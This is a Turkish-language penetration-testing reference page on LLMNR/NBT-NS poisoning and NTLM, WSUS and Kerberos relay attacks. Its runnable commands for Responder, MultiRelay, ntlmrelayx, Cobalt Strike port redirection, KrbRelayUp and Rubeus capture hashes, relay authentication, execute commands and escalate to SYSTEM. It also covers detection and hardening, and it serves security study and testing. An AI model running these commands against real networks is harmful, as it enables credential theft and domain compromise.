# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Network Protocols

### Local Host Resolution Protocols

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft ve diğer işletim sistemleri, DNS başarısız olduğunda yerel ad çözümü için LLMNR ve NBT-NS kullanır. Benzer şekilde, Apple ve Linux sistemleri mDNS kullanır.
- Bu protokoller, UDP üzerinden kimlik doğrulaması olmayan, yayın (broadcast) doğaları nedeniyle yakalanmaya ve spoof edilmeye elverişlidir.
- [Responder](https://github.com/lgandx/Responder) ve [Dementor](https://github.com/MatrixEditor/Dementor), bu protokolleri sorgulayan hostlara taklit yanıtlar göndererek servisleri taklit etmek için kullanılabilir.
- Responder kullanarak servis taklidi hakkında daha fazla bilgi [here](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD, tarayıcıların proxy ayarlarını otomatik olarak keşfetmesine olanak tanır.
- Keşif DHCP, DNS veya DNS başarısız olursa LLMNR ve NBT-NS'ye geri dönüş yoluyla yapılır.
- Responder, WPAD saldırılarını otomatikleştirebilir ve istemcileri kötü amaçlı WPAD sunucularına yönlendirebilir.

### Responder/Dementor for Protocol Poisoning

- **Responder**, LLMNR, NBT-NS ve mDNS sorgularını zehirlemek (poisoning) için kullanılan bir araçtır; sorgu tiplerine göre seçici yanıtlar verir ve öncelikle SMB servislerini hedefler.
- Kali Linux'ta önceden kurulu gelir, `/etc/responder/Responder.conf` dosyasıyla yapılandırılabilir.
- Responder, yakalanan hashleri ekranda gösterir ve bunları `/usr/share/responder/logs` dizinine kaydeder.
- Hem IPv4 hem de IPv6'yı destekler.
- Windows sürümü burada bulunabilir: [here](https://github.com/lgandx/Responder-Windows).

- **Dementor**, multicast zehirleme konularını genişletir ve ayrıca sahte servis sağlayıcı (rogue service provider) olarak davranır (CUPS RCE desteği dahil).
- Genel yapı **Responder** ile benzerdir fakat daha ayrıntılı konfigürasyon sunar. (varsayılan burada: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- **Dementor** ile **Responder** arasındaki uyumluluk burada verilmiştir: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Giriş ve dokümantasyon burada: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Belirli protokollerde Responder tarafından ortaya çıkan yakalama sorunlarını düzeltir

#### Running Responder

- Varsayılan ayarlarla Responder'ı çalıştırmak için: `responder -I <Interface>`
- Daha agresif tarama için (yan etkilere yol açabilir): `responder -I <Interface> -P -r -v`
- Kolay kırma için NTLMv1 challenge/response yakalamaya yönelik teknikler: `responder -I <Interface> --lm --disable-ess`
- WPAD taklidi şu şekilde etkinleştirilebilir: `responder -I <Interface> --wpad`
- NetBIOS istekleri saldırganın IP'sine yönlendirilebilir ve bir kimlik doğrulama proxy'si kurulabilir: `responder.py -I <interface> -Pv`

#### Running Dementor

- Varsayılan ayarlarla: `Dementor -I <interface>`
- Varsayılan ayarlarda analiz modunda: `Dementor -I <interface> -A`
- Otomatik NTLM oturum düşürme (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Geçerli oturumu özel konfig ile çalıştırmak: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- DHCP yanıtlarını spooflamak, bir kurbanın yönlendirme bilgilerini kalıcı olarak zehirleyebilir ve ARP poisoning'e kıyasla daha gizli bir alternatif sunar.
- Hedef ağın yapılandırması hakkında hassas bilgi gerektirir.
- Saldırıyı çalıştırma: `./Responder.py -I eth0 -Pdv`
- Bu yöntem NTLMv1/2 hashlerini etkili şekilde yakalayabilir, ancak ağ kesintilerini önlemek için dikkatli uygulanmalıdır.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor, yukarıda belirtilen protokolleri kullanarak servisleri taklit edecek ve bir kullanıcı sahte servise doğrulamaya çalıştığında genellikle NTLMv2 Challenge/Response şeklinde kimlik bilgilerini yakalayacaktır.
- Kimlik bilgilerini kırmayı kolaylaştırmak için NetNTLMv1'e düşürme veya ESS'i devre dışı bırakma girişimleri yapılabilir.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

It's crucial to note that employing these techniques should be done legally and ethically, ensuring proper authorization and avoiding disruption or unauthorized access.

## Inveigh

Inveigh, Windows sistemleri için tasarlanmış bir penetration tester ve red team aracı olup Responder ile benzer işlevsellikler sunar; spoofing ve man-in-the-middle saldırıları gerçekleştirir. Araç, bir PowerShell betiğinden C# binary'sine evrilmiştir; ana sürümler [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) ve [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) olarak mevcuttur. Detaylı parametreler ve talimatlar [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) üzerinde bulunabilir.

Inveigh PowerShell üzerinden çalıştırılabilir:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Veya bir C# binary olarak çalıştırılır:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Bu saldırı, SMB kimlik doğrulama oturumlarını hedef makineye erişmek için kullanır; başarılı olursa system shell sağlar. Temel önkoşullar şunlardır:

- Kimlik doğrulaması yapan kullanıcının relayed host üzerinde Local Admin erişimi olmalıdır.
- SMB signing devre dışı olmalıdır.

#### 445 Port Forwarding and Tunneling

Doğrudan ağ bağlantısı sağlanamadığı durumlarda, 445 numaralı porttaki trafik yönlendirilmeli ve tünellenmelidir. [**PortBender**](https://github.com/praetorian-inc/PortBender) gibi araçlar, port 445 trafiğini başka bir porta yönlendirmede yardımcı olur; bu, sürücü yüklemesi için Local Admin erişimi olduğunda gereklidir.

PortBender kurulumu ve Cobalt Strike içindeki kullanımı:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM Relay Attack için Diğer Araçlar

- **Metasploit**: Proxy'lar ve yerel/uzak host bilgileri ile yapılandırılır.
- **smbrelayx**: SMB oturumlarını iletmek, komut çalıştırmak veya backdoor yüklemek için bir Python betiği.
- **MultiRelay**: Responder paketinden, belirli kullanıcıları veya tüm kullanıcıları relay etmek, komut çalıştırmak veya hash'leri dump etmek için bir araç.

Her araç gerektiğinde SOCKS proxy üzerinden çalışacak şekilde yapılandırılabilir; böylece dolaylı ağ erişimiyle bile saldırılar gerçekleştirmek mümkün olur.

### MultiRelay İşleyişi

MultiRelay, _**/usr/share/responder/tools**_ dizininden çalıştırılır ve belirli IP'leri veya kullanıcıları hedef alır.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
These tools and techniques form a comprehensive set for conducting NTLM Relay attacks in various network environments.

### WSUS HTTP (8530) üzerinden NTLM Relay'i LDAP/SMB/AD CS (ESC8) için Kötüye Kullanma

WSUS istemcileri güncelleme sunucusuna NTLM üzerinden HTTP (8530) veya HTTPS (8531) ile kimlik doğrular. HTTP etkinse, istemcinin periyodik check-in'leri yerel segmentte zorlanabilir veya yakalanıp ntlmrelayx ile LDAP/LDAPS/SMB veya AD CS HTTP uç noktalarına (ESC8) çatlatma yapmadan relay edilebilir. Bu normal update trafiğine karışır ve sıkça machine-account kimlik doğrulamaları (HOST$) verir.

Nelere bakılmalı
- GPO/registry yapılandırması HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate ve ...\WindowsUpdate\AU altında:
- WUServer (ör. http://wsus.domain.local:8530)
- WUStatusServer (raporlama URL'si)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled ve DetectionFrequency (saat)
- İstemcilerin HTTP üzerinden kullandığı WSUS SOAP uç noktaları:
- /ClientWebService/client.asmx (onaylar)
- /ReportingWebService/reportingwebservice.asmx (durum)
- Varsayılan portlar: 8530/tcp HTTP, 8531/tcp HTTPS

Keşif
- Kimlik doğrulanmamış
- Dinleyicileri tarayın: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- L2 MITM ile HTTP WSUS trafiğini sniff'leyin ve aktif istemcileri/uç noktaları wsusniff.py ile kaydedin (yalnızca HTTP; istemcilerin TLS sertifikanıza güvenmesini sağlayamazsanız HTTPS için işe yaramaz).
- Kimlik doğrulanmış
- MANSPIDER + regpol ile SYSVOL GPO'larını WSUS anahtarları için ayrıştırın (wsuspider.sh wrapper WUServer/WUStatusServer/UseWUServer'ı özetler).
- Uç noktaları ölçekli sorgulayın (NetExec) veya yerelde:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

Uçtan uca HTTP relay adımları
1) MITM konumuna geçin (aynı L2) böylece bir istemci WSUS sunucusunu sizi çözümler (ARP/DNS poisoning, Bettercap, mitm6, vb.). arpspoof ile örnek:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Port 8530'ı relay dinleyicinize yönlendirin (opsiyonel, kullanışlı):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) HTTP dinleyicili ntlmrelayx'i başlatın (HTTP dinleyici için Impacket desteği gerekir; aşağıdaki PR'lara bakın):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Diğer yaygın hedefler:
- Exec/dump için SMB'ye relay (signing kapalıysa): -t smb://<host>
- Dizin değişiklikleri için LDAPS'e relay (ör. RBCD): -t ldaps://<DC>
- AD CS web enrollment (ESC8) için relay ederek bir sertifika düzenleyip sonra Schannel/PKINIT ile kimlik doğrulama:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
AD CS kötüye kullanım yolları ve araçları için AD CS sayfasına bakın:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Bir istemci check-in tetikleyin veya zamanlamayı bekleyin. İstemciden:
wuauclt.exe /detectnow
veya Windows Update UI (Check for updates) kullanın.

5) Kimlik doğrulanmış SOCKS oturumlarını kullanın (eğer -socks ise) veya doğrudan relay sonuçlarını post-exploitation için kullanın (LDAP değişiklikleri, SMB işlemleri veya ileride kimlik doğrulama için AD CS sertifika düzenlemesi).

HTTPS kısıtlaması (8531)
- WSUS'un HTTPS üzerinden pasif olarak yakalanması, istemciler sertifikanıza güvenmedikçe etkisizdir. Güvenilir bir sertifika veya başka bir TLS kırma yöntemi olmadan, WSUS HTTPS trafiğinden NTLM handshake toplanamaz/relay edilemez.

Notlar
- WSUS kullanım dışı ilan edildi ama yaygın olarak dağıtılmış durumda; HTTP (8530) birçok ortamda hâlâ yaygın.
- Faydalı yardımcılar: wsusniff.py (HTTP WSUS check-in'lerini gözlemleyin), wsuspider.sh (GPO'lardan WUServer/WUStatusServer'ı sıralayın), ölçekli NetExec reg-query.
- Impacket, ntlmrelayx için HTTP dinleyici desteğini PR #2034 ile geri ekledi (ilk eklenen PR #913 idi).

### Force NTLM Logins

Windows'ta bazı ayrıcalıklı hesapları rastgele makinelere kimlik doğrulama yapmaya **zorlayabiliyor olabilirsiniz**. Nasıl yapılacağını öğrenmek için aşağıdaki sayfayı okuyun:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay saldırısı

Bir **Kerberos relay saldırısı**, bir servisten bir **AP-REQ ticket** çalar ve aynı **bilgisayar-hesap anahtarını** paylaşan (çünkü her iki SPN aynı `$` machine account üzerinde) ikinci bir servise tekrar kullanır. Bu, SPN'lerin **service class**'ları farklı olsa bile (ör. `CIFS/` → `LDAP/`) çalışır çünkü bileti çözen *anahtar*, SPN string'i değil makinenin NT hash'idir ve SPN string'i imzanın bir parçası değildir.

NTLM relay'den farklı olarak, atlama *aynı host* ile sınırlıdır ancak LDAP'a yazmanıza izin veren bir protokolü hedeflerseniz, bunu **Resource-Based Constrained Delegation (RBCD)** veya **AD CS enrollment** zincirine bağlayabilir ve tek seferde **NT AUTHORITY\SYSTEM** elde edebilirsiniz.

Bu saldırı hakkında detaylı bilgi için bkz:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos temelleri**

| Token | Amaç | Relay ile ilişki |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Kullanıcıyı KDC'ye kanıtlar | değişmez |
| **Service ticket / TGS-REQ ↔ REP** | Tek bir **SPN**'e bağlı; SPN sahibinin anahtarı ile şifrelenir | SPN'ler aynı hesabı paylaşırsa değiş tokuş edilebilir |
| **AP-REQ** | İstemci `TGS`'yi servise gönderir | **çaldığımız ve tekrar oynattığımız şey** |

* Biletler, **SPN'e sahip hesabın parola-türetilmiş anahtarıyla** şifrelenir.
* AP-REQ içindeki **Authenticator** 5 dakikalık bir zaman damgasına sahiptir; bu pencere içinde tekrar oynatma, servis önbelleği aynı paketi görene kadar geçerlidir.
* Windows genellikle biletin içindeki SPN string'inin vurduğunuz servisle eşleşip eşleşmediğini kontrol etmez, bu yüzden `CIFS/HOST` için bir bilet normalde `LDAP/HOST` üzerinde düzgün şekilde çözülür.

- 2. **Kerberos relay yapabilmek için nelerin doğru olması gerekir**

1. **Paylaşılan anahtar:** kaynak ve hedef SPN'ler aynı computer account'a ait olmalı (Windows sunucularında varsayılan).
2. **Kanaldışı koruma:** SMB/LDAP signing kapalı ve HTTP/LDAPS için EPA kapalı olmalı.
3. **Kimlik doğrulamayı yakalayabilme veya zorlayabilme:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, vb.
4. **Bilet kaynağı zaten kullanılmamış olmalı:** gerçek paket gelmeden önce yarışı kazanmalısınız veya tamamen engellemelisiniz; aksi halde servis replay cache'i Event 4649 tetikler.
5. İletişimde bir şekilde **MitM gerçekleştirebilme** yeteneğiniz olmalı; ör. domain DNS'ini değiştirebilmek için DNSAmins grubunun bir üyesi olmak veya kurbanın HOST dosyasını değiştirebilmek gibi.

### Kerberos Relay Adımları

- 3.1 **Hedefi keşfetme**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Relay dinleyicisini başlat**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass**'ı tek bir binary içinde birleştirir.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce, DC'nin bize Kerberos `CIFS/DC01` bileti göndermesini sağlar.

- 3.4 **Relay the AP-REQ**

KrbRelay, SMB'den GSS blob'unu çıkarır, bunu bir LDAP bind'ine yeniden paketler ve `ldap://DC01`'a iletir—authentication succeeds because the **same key** decrypts it.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Artık **NT AUTHORITY\SYSTEM**'e sahipsin.


### **Bilmeniz Gereken Diğer Yollar**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Sahte sunucu herhangi bir SPN ile bir **GSS-ID payload** gönderir; istemci doğrudan sana bir AP-REQ oluşturur | Alt ağlar arasında bile çalışır; makine kimlik bilgileri varsayılan olarak kullanılır |
| **DCOM / MSRPC** | Kötü amaçlı OXID resolver, istemciyi rastgele bir SPN ve porta auth etmeye zorlar | Tamamen *local* priv-esc; firewall'ı atlar |
| **AD CS Web Enroll** | Makine biletini `HTTP/CA`'ya relay et ve bir sertifika al, sonra **PKINIT** ile TGT üret | LDAP signing savunmalarını atlar |
| **Shadow Credentials** | `msDS-KeyCredentialLink` yaz, sonra sahte anahtar çifti ile PKINIT yap | Bilgisayar hesabı eklemeye gerek yok |

### **Sorun Giderme**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ticket anahtarı ≠ hedef anahtarı | Yanlış host/SPN |
| `KRB_AP_ERR_SKEW` | Saat farkı > 5 dk | Zamanı senkronize et veya `w32tm` kullan |
| LDAP bind fails | Signing zorunlu | AD CS yolunu kullan veya signing'i devre dışı bırak |
| Event 4649 spam | Servis duplicate Authenticator gördü | Orijinal paketi engelle veya yarış durumu oluştur |

### **Tespit**

* Aynı kaynaktan saniyeler içinde `CIFS/`, `HTTP/`, `LDAP/` için **Event 4769**'da ani artış.
* Servisteki **Event 4649** replay tespit edildiğini gösterir.
* **127.0.0.1**'den Kerberos logon (local SCM'e relay) son derece şüphelidir — KrbRelayUp dokümanlarındaki Sigma kuralı ile eşle.
* `msDS-AllowedToActOnBehalfOfOtherIdentity` veya `msDS-KeyCredentialLink` attribute'larındaki değişiklikleri izle.

## **Sertleştirme**

1. Her sunucuda **LDAP & SMB signing + EPA**'yı zorunlu kıl.
2. SPN'leri ayır, böylece HTTP aynı hesapta CIFS/LDAP ile olmasın.
3. Zorlamaya bağlı vektörleri patchle (PetitPotam KB5005413, DFS, AuthIP).
4. Sahte bilgisayar katılımlarını durdurmak için **`ms-DS-MachineAccountQuota = 0`** ayarla.
5. **Event 4649** ve beklenmeyen loopback Kerberos logonları için alarm kur.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
